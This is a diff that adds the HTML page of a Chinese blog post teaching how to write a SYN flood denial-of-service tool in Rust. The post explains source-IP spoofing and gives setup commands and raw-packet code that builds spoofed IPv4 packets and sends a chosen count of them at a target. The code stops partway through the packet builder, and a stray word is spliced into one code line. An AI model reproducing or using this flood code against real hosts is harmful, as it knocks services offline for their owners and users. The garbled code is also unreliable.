@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="zh"
+  x-data
+  :class="$store.darkMode.class()"
+  :data-theme="$store.darkMode.theme()">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门 | Liangdi&#x27;s Blog</title>
+
+  
+
+
+
+<link rel="canonical" href="https://liangdi.me/p/rust-hacking-programing-syn-flood-ddos/" />
+
+
+
+
+
+<meta name="author" content="Liangdi" />
+
+
+
+<link rel="stylesheet" href="/css/output.css" />
+
+
+
+
+  
+  
+  
+
+  
+
+<style>
+  pre {
+    padding: 1em;
+    overflow: auto;
+  }
+</style>
+
+
+
+  
+
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+  <script>
+    // DevTools / external bridge: anycms DevTools flips dark mode by setting
+    // `data-theme="dark"|"light"` on <html> (the convention used by the ink/
+    // folio/manual themes). dream instead drives `data-theme` reactively via
+    // the Alpine `$store.darkMode` store (values: emerald/forest), so the
+    // DevTools attribute would be clobbered. This observer translates the
+    // external `dark`/`light` hint into a store toggle, letting DevTools (and
+    // any tool using the platform convention) control dream's mode. Safe from
+    // recursion: the store then sets emerald/forest, which are not dark/light,
+    // so the observer does not re-fire.
+    (function () {
+      var html = document.documentElement;
+      document.addEventListener('alpine:initialized', function () {
+        apply();
+        new MutationObserver(apply).observe(html, {
+          attributes: true,
+          attributeFilter: ['data-theme'],
+        });
+      });
+      function apply() {
+        var t = html.getAttribute('data-theme');
+        if (t !== 'dark' && t !== 'light') return;
+        if (!window.Alpine) return;
+        var store = Alpine.store('darkMode');
+        if (!store) return;
+        var want = t === 'dark' ? 'y' : 'n';
+        if (store.on !== want) store.toggle(want);
+      }
+    })();
+  </script>
+</head>
+
+<body x-data="{ flip: false }">
+  
+  <div id="dream-global-bg"></div>
+
+  
+
+
+<nav class="mt-4 lg:mt-8 py-4">
+
+  <div class="container flex justify-between max-w-[65ch] mx-auto px-4 md:px-0">
+    <section class="flex items-center gap-4">
+      
+      <div>
+        <a href="https://liangdi.me" class="text-lg font-semibold cursor-pointer">
+          Liangdi&#x27;s Blog
+        </a>
+      </div>
+      
+    </section>
+
+    <div class="dropdown dropdown-end sm:hidden">
+      <div tabindex="0" role="button" class="btn btn-ghost btn-square" aria-label="菜单">
+        <ion-icon name="menu" class="text-2xl"></ion-icon>
+      </div>
+      <ul class="dropdown-content menu w-36 bg-base-100 rounded-box z-[1] shadow-md">
+        <li><a href="/search/">搜索</a></li>
+        <li><a href="/archive/">归档</a></li>
+        <li><a href="/categories/">分类</a></li>
+        <li><a href="/tags/">标签</a></li>
+        <li><a href="/atom.xml">RSS</a></li>
+      </ul>
+    </div>
+
+    <section class="hidden sm:flex sm:items-center sm:gap-2 md:gap-4">
+      
+
+      
+  
+  <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/search/" title="搜索">
+    <ion-icon class="group-hover:text-primary-content" name="search"></ion-icon>
+  </a>
+  
+
+      
+  
+  <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/atom.xml" title="RSS">
+    <ion-icon class="group-hover:text-primary-content" name="logo-rss"></ion-icon>
+  </a>
+  
+
+      
+  
+  <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/archive/" title="归档">
+    <ion-icon class="group-hover:text-primary-content" name="archive"></ion-icon>
+  </a>
+  
+
+      
+  
+  <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/categories/" title="分类">
+    <ion-icon class="group-hover:text-primary-content" name="grid"></ion-icon>
+  </a>
+  
+
+      
+  
+  <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary" href="/tags/" title="标签">
+    <ion-icon class="group-hover:text-primary-content" name="pricetags"></ion-icon>
+  </a>
+  
+
+    </section>
+  </div>
+</nav>
+
+  <div class="flip-container" :class="{ 'flip-it': flip }">
+    <div class="flipper">
+      <div class="front">
+        <div class="container">
+          
+<div class="mt-4 px-4">
+  
+  <div class="relative" x-data="{ height: '' }" x-init="height = $el.scrollHeight + 'px'">
+  
+    
+    <div class="absolute right-0 lg:w-36 xl:w-48 hidden lg:block" :style="{ height }">
+      <nav class="toc text-sm" aria-label="目录">
+        
+        <div style="margin-left: 0px"><a href="#概述">概述</a></div>
+        
+        <div style="margin-left: 0px"><a href="#syn-flood-原理">SYN Flood 原理</a></div>
+        
+        <div style="margin-left: 0px"><a href="#准备工作">准备工作</a></div>
+        
+        <div style="margin-left: 0px"><a href="#编码实现">编码实现</a></div>
+        
+        <div style="margin-left: 0px"><a href="#测试">测试</a></div>
+        
+        <div style="margin-left: 12px"><a href="#攻击鸡-192-168-31-245">攻击鸡(192.168.31.245)</a></div>
+        
+        <div style="margin-left: 12px"><a href="#出头鸡-192-168-31-19">出头鸡(192.168.31.19)</a></div>
+        
+        <div style="margin-left: 0px"><a href="#躺枪鸡">躺枪鸡</a></div>
+        
+        <div style="margin-left: 0px"><a href="#补充">补充</a></div>
+        
+        <div style="margin-left: -12px"><a href="#小结">小结</a></div>
+        
+      </nav>
+    </div>
+    
+    <article class="mx-auto prose prose-quoteless dark:prose-invert" id="dream-single-post-main" itemscope itemtype="http://schema.org/Article">
+      <header>
+        <h1 itemprop="headline">Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门</h1>
+        <p class="text-sm">
+          
+          <span data-format="luxon">2022-06-03T16:01:32+08:00</span>
+          
+        </p>
+        <div class="flex justify-between">
+          
+          
+
+
+
+
+
+<div class="flex items-center">
+  
+  <span>@</span>
+  
+
+  <span itemprop="author" itemscope itemtype="https://schema.org/Person">
+    
+      
+      <span itemprop="name">Liangdi</span>
+      
+    
+  </span>
+</div>
+          
+
+<div class="flex items-center gap-2">
+  <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+    href="https://x.com/intent/post?text=Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门&url=https:&#x2f;&#x2f;liangdi.me&#x2f;p&#x2f;rust-hacking-programing-syn-flood-ddos&#x2f;" target="_blank" rel="noopener noreferrer" title="分享到 X">
+    <ion-icon class="group-hover:text-primary-content" name="logo-x"></ion-icon>
+  </a>
+  <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+    href="https://facebook.com/sharer/sharer.php?u=https:&#x2f;&#x2f;liangdi.me&#x2f;p&#x2f;rust-hacking-programing-syn-flood-ddos&#x2f;" target="_blank" rel="noopener noreferrer" title="分享到 Facebook">
+    <ion-icon class="group-hover:text-primary-content" name="logo-facebook"></ion-icon>
+  </a>
+  <a class="group inline-flex items-center p-2 rounded-full cursor-pointer hover:bg-primary"
+    href="https://wa.me/?text=Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门 https:&#x2f;&#x2f;liangdi.me&#x2f;p&#x2f;rust-hacking-programing-syn-flood-ddos&#x2f;" target="_blank" rel="noopener noreferrer" title="分享到 WhatsApp">
+    <ion-icon class="group-hover:text-primary-content" name="logo-whatsapp"></ion-icon>
+  </a>
+</div>
+        </div>
+      </header>
+
+      
+
+      <h2 id="概述">概述</h2>
+<p>DDoS 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/</p>
+<p>如果黑客攻击技术有层次之分, 那么 DDoS 攻击可以比喻为: 花钱请了一堆打手,攻击目标, 没有什么技术含量又有效果,目标也要付出不少成本才能防护的了.</p>
+<p>那 Rust 能编写 DDoS 软件吗? 答案当然是可以的,基本上所有语言都可以编写.</p>
+<p>DDoS 工具说到底就是充分利用了网络协议的标准, 然后不讲道理恶意利用而以. 第一个 D, distributed , 分布式, 就不在我们今天内容的范畴了, 后面将结合其他内容一起写.</p>
+<p>DDoS 攻击大多数发生在 3,4,7 层网络, SYN Flood 就是在 TCP 协议上实现的.</p>
+<h2 id="syn-flood-原理">SYN Flood 原理</h2>
+<p>SYN Flood 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/syn-flood-ddos-attack/</p>
+<p>SYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只伸手, 就不和对方握手,导致对方一直准备着和你握手, 就没法完成其他正常的握手动作了.</p>
+<p>那丛技术实现原理来看, 就是不停的构建 TCP-SYN 数据包,发给目标 IP 地址, 对于目标响应的 SYN/ACK 信息不做处理, 甚至是伪造发送端 IP ,使得目标将响应的 SYN/ACK 发送到其他 IP 地址去.</p>
+<h2 id="准备工作">准备工作</h2>
+<ul>
+<li>还是使用 pnet 库 (基于 pcap)</li>
+<li>尝试伪造 IP (伪造 IP 对于公网 ISP 服务商基本都限制了,可以在内网实现).</li>
+<li>TCP 协议就不展开讲了.</li>
+</ul>
+<h2 id="编码实现">编码实现</h2>
+<p>创建项目, 并且添加基本以来 cargo add 的功能来自 cargo-edit 这个项目, 如果系统没有,可以使用 cargo install cargo-edit 安装该功能</p>
+<pre><code class="language-bash"><span class="source shell bash"><span class="meta function-call shell"><span class="variable function shell">cargo</span></span><span class="meta function-call arguments shell"> new syn-flood-demo</span>
+<span class="meta function-call shell"><span class="support function cd shell">cd</span></span><span class="meta function-call arguments shell"> syn-flood-demo</span>
+<span class="meta function-call shell"><span class="variable function shell">cargo</span></span><span class="meta function-call arguments shell"> add pnet</span>
+<span class="meta function-call shell"><span class="variable function shell">cargo</span></span><span class="meta function-call arguments shell"> add pnet_transport</span>
+<span class="meta function-call shell"><span class="variable function shell">cargo</span></span><span class="meta function-call arguments shell"> add rand</span>
+<span class="meta function-call shell"><span class="variable function shell">cargo</span></span><span class="meta function-call arguments shell"> add anyhow</span>
+<span class="meta function-call shell"><span class="variable function shell">cargo</span></span><span class="meta function-call arguments shell"> add clap<span class="variable parameter option shell"><span class="punctuation definition parameter shell"> -</span>F</span> derive</span>
+</span></code></pre>
+<p>Demo 代码</p>
+<pre><code class="language-rust"><span class="source rust"><span class="keyword other rust">use</span> <span class="meta path rust">std<span class="punctuation accessor rust">::</span></span><span class="meta path rust">net<span class="punctuation accessor rust">::</span></span>Ipv4Addr<span class="punctuation terminator rust">;</span>
+
+<span class="keyword other rust">use</span> <span class="meta path rust">clap<span class="punctuation accessor rust">::</span></span>Parser<span class="punctuation terminator rust">;</span>
+<span class="keyword other rust">use</span> <span class="meta path rust">pnet<span class="punctuation accessor rust">::</span></span><span class="meta block rust"><span class="punctuation section block begin rust">{</span><span class="meta path rust">packet<span class="punctuation accessor rust">::</span></span><span class="meta block rust"><span class="punctuation section block begin rust">{</span><span class="meta path rust">tcp<span class="punctuation accessor rust">::</span></span><span class="meta block rust"><span class="punctuation section block begin rust">{</span>TcpPacket<span class="punctuation separator rust">,</span> MutableTcpPacket<span class="punctuation separator rust">,</span> TcpFlags<span class="punctuation separator rust">,</span> ipv4_checksum<span class="punctuation separator rust">,</span> TcpOption</span><span class="meta block rust"><span class="punctuation section block end rust">}</span></span><span class="punctuation separator rust">,</span> <span class="meta path rust">ipv4<span class="punctuation accessor rust">::</span></span><span class="meta block rust"><span class="punctuation section block begin rust">{</span>MutableIpv4Packet<span class="punctuation separator rust">,</span> checksum<span class="punctuation separator rust">,</span> Ipv4Flags</span><span class="meta block rust"><span class="punctuation section block end rust">}</span></span><span class="punctuation separator rust">,</span> <span class="meta path rust">ip<span class="punctuation accessor rust">::</span></span>IpNextHeaderProtocols</span><span class="meta block rust"><span class="punctuation section block end rust">}</span></span><span class="punctuation separator rust">,</span> </span><span class="meta block rust"><span class="punctuation section block end rust">}</span></span><span class="punctuation terminator rust">;</span>
+<span class="keyword other rust">use</span> <span class="meta path rust">pnet_transport<span class="punctuation accessor rust">::</span></span>transport_channel<span class="punctuation terminator rust">;</span>
+<span class="keyword other rust">use</span> <span class="meta path rust">pnet_transport<span class="punctuation accessor rust">::</span></span><span class="meta path rust">TransportChannelType<span class="punctuation accessor rust">::</span></span>Layer3<span class="punctuation terminator rust">;</span>
+<span class="keyword other rust">use</span> <span class="meta path rust">rand<span class="punctuation accessor rust">::</span></span><span class="meta block rust"><span class="punctuation section block begin rust">{</span>random<span class="punctuation separator rust">,</span> thread_rng<span class="punctuation separator rust">,</span> Rng</span><span class="meta block rust"><span class="punctuation section block end rust">}</span></span><span class="punctuation terminator rust">;</span>
+
+<span class="meta annotation rust"><span class="punctuation definition annotation rust">#</span><span class="punctuation section group begin rust">[</span><span class="variable annotation rust">derive</span><span class="meta annotation parameters rust"><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span></span><span class="meta annotation parameters rust"><span class="meta group rust">Parser<span class="punctuation separator rust">,</span> Debug</span></span><span class="meta annotation parameters rust"><span class="meta group rust"><span class="punctuation section group end rust">)</span></span></span><span class="punctuation section group end rust">]</span></span>
+<span class="meta annotation rust"><span class="punctuation definition annotation rust">#</span><span class="punctuation section group begin rust">[</span><span class="variable annotation rust">clap</span><span class="meta annotation parameters rust"><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span></span><span class="meta annotation parameters rust"><span class="meta group rust">author<span class="punctuation separator rust">,</span> version<span class="punctuation separator rust">,</span> about<span class="punctuation separator rust">,</span> long_about <span class="keyword operator rust">=</span> None</span></span><span class="meta annotation parameters rust"><span class="meta group rust"><span class="punctuation section group end rust">)</span></span></span><span class="punctuation section group end rust">]</span></span>
+<span class="meta struct rust"><span class="storage type struct rust">struct</span> </span><span class="meta struct rust"><span class="entity name struct rust">Args</span> </span><span class="meta struct rust"><span class="meta block rust"><span class="punctuation section block begin rust">{</span>
+    #[clap(short, long)]
+    <span class="variable other member rust">target</span><span class="punctuation separator rust">:</span>String,
+    #[clap(short, long)]
+    <span class="variable other member rust">source</span><span class="punctuation separator rust">:</span>String,
+    #[clap(short, long)]
+    <span class="variable other member rust">port</span><span class="punctuation separator rust">:</span><span class="storage type rust">u32</span>,
+    #[clap(short, long)]
+    <span class="variable other member rust">count</span><span class="punctuation separator rust">:</span><span class="storage type rust">u32</span>
+</span><span class="meta block rust"><span class="punctuation section block end rust">}</span></span></span>
+<span class="storage type rust">const</span> <span class="constant other rust">IPV4_HEADER_LEN</span><span class="punctuation separator rust">:</span> <span class="storage type rust">usize</span> <span class="keyword operator rust">=</span> <span class="constant numeric integer decimal rust">20</span><span class="punctuation terminator rust">;</span>
+<span class="storage type rust">const</span> <span class="constant other rust">TCP_HEADER_LEN</span><span class="punctuation separator rust">:</span> <span class="storage type rust">usize</span> <span class="keyword operator rust">=</span> <span class="constant numeric integer decimal rust">32</span><span class="punctuation terminator rust">;</span>
+<span class="storage type rust">const</span> <span class="constant other rust">TEST_DATA_LEN</span><span class="punctuation separator rust">:</span> <span class="storage type rust">usize</span> <span class="keyword operator rust">=</span> <span class="constant numeric integer decimal rust">1024</span><span class="punctuation terminator rust">;</span>
+<span class="meta function rust"><span class="meta function rust"><span class="storage type function rust">fn</span> </span><span class="entity name function rust">main</span></span><span class="meta function rust"><span class="meta function parameters rust"><span class="punctuation section parameters begin rust">(</span></span><span class="meta function rust"><span class="meta function parameters rust"><span class="punctuation section parameters end rust">)</span></span></span></span><span class="meta function rust"> </span><span class="meta function rust"><span class="meta block rust"><span class="punctuation section block begin rust">{</span>
+    <span class="storage type rust">let</span> args <span class="keyword operator rust">=</span> <span class="meta path rust">Args<span class="punctuation accessor rust">::</span></span>parse<span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    <span class="support macro rust">println!</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="string quoted double rust"><span class="punctuation definition string begin rust">&quot;</span>args:<span class="constant other placeholder rust">{:?}</span><span class="punctuation definition string end rust">&quot;</span></span></span><span class="meta group rust"><span class="punctuation separator rust">,</span>args<span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+
+    <span class="comment line double-slash rust"><span class="punctuation definition comment rust">//</span> 选择 3 层 IPv4 协议, 构建发送器
+</span>    <span class="storage type rust">let</span> protocol <span class="keyword operator rust">=</span> Layer3<span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="meta path rust">IpNextHeaderProtocols<span class="punctuation accessor rust">::</span></span>Ipv4</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    <span class="storage type rust">let</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="storage modifier rust">mut</span> tx<span class="punctuation separator rust">,</span> <span class="keyword operator rust">_</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span> <span class="keyword operator rust">=</span> <span class="keyword control rust">match</span>  <span class="support function rust">transport_channel</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="constant numeric integer decimal rust">64</span><span class="punctuation separator rust">,</span>protocol</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span> <span class="meta block rust"><span class="punctuation section block begin rust">{</span>
+        <span class="support type rust">Ok</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span> tx<span class="punctuation separator rust">,</span> rx</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span> <span class="keyword operator rust">=&gt;</span> <span class="meta group rust"><span class="punctuation section group begin rust">(</span>tx<span class="punctuation separator rust">,</span>rx</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation separator rust">,</span>
+        <span class="support type rust">Err</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span>e</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span> <span class="keyword operator rust">=&gt;</span> <span class="support macro rust">panic!</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="string quoted double rust"><span class="punctuation definition string begin rust">&quot;</span>Error happened {}<span class="punctuation definition string end rust">&quot;</span></span><span class="punctuation separator rust">,</span> e</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation separator rust">,</span>
+    </span><span class="meta block rust"><span class="punctuation section block end rust">}</span></span><span class="punctuation terminator rust">;</span>
+
+    <span class="storage type rust">let</span> target<span class="punctuation separator rust">:</span> Ipv4Addr <span class="keyword operator rust">=</span> args.target.<span class="support function rust">clone</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span>.<span class="support function rust">parse</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span>.<span class="support function rust">unwrap</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    <span class="comment line double-slash rust"><span class="punctuation definition comment rust">//</span> 根据 --count -c 这个参数设置发送的数据包数量
+</span>    <span class="comment line double-slash rust"><span class="punctuation definition comment rust">//</span> TODO 可以改成多线程发送,性能能再提高
+</span>    <span class="keyword control rust">for</span> <span class="keyword operator rust">_</span> <span class="keyword operator rust">in</span> <span class="constant numeric integer decimal rust">0</span><span class="keyword operator rust">..</span>args.count <span class="meta block rust"><span class="punctuation section block begin rust">{</span>
+        <span class="comment line double-slash rust"><span class="punctuation definition comment rust">//</span> 构建数据包
+</span>        <span class="storage type rust">let</span> <span class="storage modifier rust">mut</span> packet <span class="keyword operator rust">=</span> <span class="meta group rust"><span class="punctuation section group begin rust">[</span><span class="constant numeric integer decimal rust">0</span><span class="storage type numeric rust">u8</span><span class="punctuation separator rust">;</span> <span class="constant other rust">IPV4_HEADER_LEN</span> <span class="keyword operator rust">+</span> <span class="constant other rust">TCP_HEADER_LEN</span> <span class="keyword operator rust">+</span> <span class="constant other rust">TEST_DATA_LEN</span><span class="punctuation section group end rust">]</span></span><span class="punctuation terminator rust">;</span>
+        <span class="storage type rust">let</span> packet <span class="keyword operator rust">=</span> <span class="support function rust">build_packet</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span>args.source.<span class="support function rust">clone</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation separator rust">,</span> args.target.<span class="support function rust">clone</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation separator rust">,</span> args.port<span class="punctuation separator rust">,</span> <span class="keyword operator rust">&amp;</span><span class="storage modifier rust">mut</span> packet<span class="meta group rust"><span class="punctuation section group begin rust">[</span><span class="keyword operator rust">..</span><span class="punctuation section group end rust">]</span></span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    
+        <span class="comment line double-slash rust"><span class="punctuation definition comment rust">//</span>println!(&quot;packet:{:#?}&quot;,packet);
+</span>        <span class="comment line double-slash rust"><span class="punctuation definition comment rust">//</span> 发送数据包到目标地址
+</span>        tx.<span class="support function rust">send_to</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span>packet<span class="punctuation separator rust">,</span><span class="meta path rust">std<span class="punctuation accessor rust">::</span></span><span class="meta path rust">net<span class="punctuation accessor rust">::</span></span><span class="meta path rust">IpAddr<span class="punctuation accessor rust">::</span></span><span class="constant other rust">V4</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span>target</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    </span><span class="meta block rust"><span class="punctuation section block end rust">}</span></span>
+    
+    
+</span><span class="meta block rust"><span class="punctuation section block end rust">}</span></span></span>
+
+<span class="meta function rust"><span class="meta function rust"><span class="storage type function rust">fn</span> </span><span class="entity name function rust">build_packet</span></span><span class="meta function rust"><span class="meta function parameters rust"><span class="punctuation section parameters begin rust">(</span><span class="variable parameter rust">source</span><span class="punctuation separator rust">:</span>String,<span class="variable parameter rust">target</span><span class="punctuation separator rust">:</span>String,<span class="variable parameter rust">port</span><span class="punctuation separator rust">:</span><span class="storage type rust">u32</span>,<span class="variable parameter rust">packet</span><span class="punctuation separator rust">:</span> <span class="keyword operator rust">&amp;</span><span class="storage modifier rust">mut</span> [<span class="storage type rust">u8</span>]</span><span class="meta function rust"><span class="meta function parameters rust"><span class="punctuation section parameters end rust">)</span></span></span></span><span class="meta function rust"> <span class="meta function return-type rust"><span class="punctuation separator rust">-&gt;</span> TcpPacket</span></span><span class="meta function rust"><span class="meta block rust"><span class="punctuation section block begin rust">{</span>
+<span class="comment line double-slash rust"><span class="punctuation definition comment rust">//</span> Set data
+</span>    packet<span class="meta group rust"><span class="punctuation section group begin rust">[</span><span class="constant other rust">IPV4_HEADER_LEN</span> <span class="keyword operator rust">+</span> <span class="constant other rust">TCP_HEADER_LEN</span><span class="punctuation section group end rust">]</span></span> <span class="keyword operator rust">=</span> <span class="string quoted single rust"><span class="punctuation definition string begin rust">&#39;</span>t<span class="punctuation definition string end rust">&#39;</span></span> <span class="keyword operator rust">as</span> <span class="storage type rust">u8</span><span class="punctuation terminator rust">;</span>
+    packet<span class="meta group rust"><span class="punctuation section group begin rust">[</span><span class="constant other rust">IPV4_HEADER_LEN</span> <span class="keyword operator rust">+</span> <span class="constant other rust">TCP_HEADER_LEN</span> <span class="keyword operator rust">+</span> <span class="constant numeric integer decimal rust">1</span><span class="punctuation section group end rust">]</span></span> <span class="keyword operator rust">=</span> <span class="string quoted single rust"><span class="punctuation definition string begin rust">&#39;</span>e<span class="punctuation definition string end rust">&#39;</span></span> <span class="keyword operator rust">as</span> <span class="storage type rust">u8</span><span class="punctuation terminator rust">;</span>
+    packet<span class="meta group rust"><span class="punctuation section group begin rust">[</span><span class="constant other rust">IPV4_HEADER_LEN</span> <span class="keyword operator rust">+</span> <span class="constant other rust">TCP_HEADER_LEN</span> <span class="keyword operator rust">+</span> <span class="constant numeric integer decimal rust">2</span><span class="punctuation section group end rust">]</span></span> <span class="keyword operator rust">=</span> <span class="string quoted single rust"><span class="punctuation definition string begin rust">&#39;</span>s<span class="punctuation definition string end rust">&#39;</span></span> <span class="keyword operator rust">as</span> <span class="storage type rust">u8</span><span class="punctuation terminator rust">;</span>
+    packet<span class="meta group rust"><span class="punctuation section group begin rust">[</span><span class="constant other rust">IPV4_HEADER_LEN</span> <span class="keyword operator rust">+</span> <span class="constant other rust">TCP_HEADER_LEN</span> <span class="keyword operator rust">+</span> <span class="constant numeric integer decimal rust">3</span><span class="punctuation section group end rust">]</span></span> <span class="keyword operator rust">=</span> <span class="string quoted single rust"><span class="punctuation definition string begin rust">&#39;</span>t<span class="punctuation definition string end rust">&#39;</span></span> <span class="keyword operator rust">as</span> <span class="storage type rust">u8</span><span class="punctuation terminator rust">;</span>情况
+
+    <span class="storage type rust">let</span> ipv4_source<span class="punctuation separator rust">:</span> Ipv4Addr <span class="keyword operator rust">=</span> source.<span class="support function rust">parse</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span>.<span class="support function rust">unwrap</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    <span class="storage type rust">let</span> ipv4_destination<span class="punctuation separator rust">:</span>Ipv4Addr <span class="keyword operator rust">=</span> target.<span class="support function rust">parse</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span>.<span class="support function rust">unwrap</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    <span class="meta block rust"><span class="punctuation section block begin rust">{</span>
+        <span class="storage type rust">let</span> len <span class="keyword operator rust">=</span> packet.<span class="support function rust">len</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+        <span class="storage type rust">let</span> <span class="storage modifier rust">mut</span> ip_header <span class="keyword operator rust">=</span> <span class="meta path rust">MutableIpv4Packet<span class="punctuation accessor rust">::</span></span>new<span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="keyword operator rust">&amp;</span><span class="storage modifier rust">mut</span> packet<span class="meta group rust"><span class="punctuation section group begin rust">[</span><span class="keyword operator rust">..</span><span class="punctuation section group end rust">]</span></span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span>.<span class="support function rust">unwrap</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+        ip_header.<span class="support function rust">set_next_level_protocol</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="meta path rust">IpNextHeaderProtocols<span class="punctuation accessor rust">::</span></span>Tcp</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+        ip_header.<span class="support function rust">set_source</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span>ipv4_source</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+        ip_header.<span class="support function rust">set_flags</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="meta path rust">Ipv4Flags<span class="punctuation accessor rust">::</span></span>DontFragment</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+        ip_header.<span class="support function rust">set_destination</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span>ipv4_destination</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+        ip_header.<span class="support function rust">set_ttl</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="constant numeric integer decimal rust">128</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+        ip_header.<span class="support function rust">set_version</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="constant numeric integer decimal rust">4</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+        ip_header.<span class="support function rust">set_header_length</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="constant numeric integer decimal rust">5</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+        <span class="storage type rust">let</span> checksum <span class="keyword operator rust">=</span> <span class="support function rust">checksum</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span><span class="keyword operator rust">&amp;</span>ip_header.<span class="support function rust">to_immutable</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+        ip_header.<span class="support function rust">set_checksum</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span>checksum</span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
+    </span><span class="meta block rust"><span class="punctuation section block end rust">}</span></span>
+    <span class="storage type rust">let</span> <span class="storage modifier rust">mut</span> rng <span class="keyword operator rust">=</span> <span class="support function rust">thread_rng</span><span class="meta group rust"><span class="punctuation section group begin rust">(</span></span><span class="meta group rust"><span class="punctuation section group end rust">)</span></span><span class="punctuation terminator rust">;</span>
